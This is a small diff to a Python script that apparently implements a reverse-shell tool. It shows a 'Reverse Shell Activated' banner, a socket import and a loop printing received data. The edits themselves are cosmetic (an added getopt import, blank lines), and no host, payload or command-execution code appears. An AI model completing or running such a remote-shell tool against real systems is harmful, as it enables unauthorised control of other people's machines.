@@ -1,8 +1,10 @@
 # Importing modules required
 from socket import socket
-import sys
+import sys, getopt
 import pyfiglet
 import os
+
+
 os.system("clear")
 # Creating and printing out banner
 ascii_banner = pyfiglet.figlet_format("Reverse Shell \n Activated")
@@ -29,5 +31,4 @@ def connect():
             print(conn.recv(1024).decode())
 def main():
     connect()
-
 main()
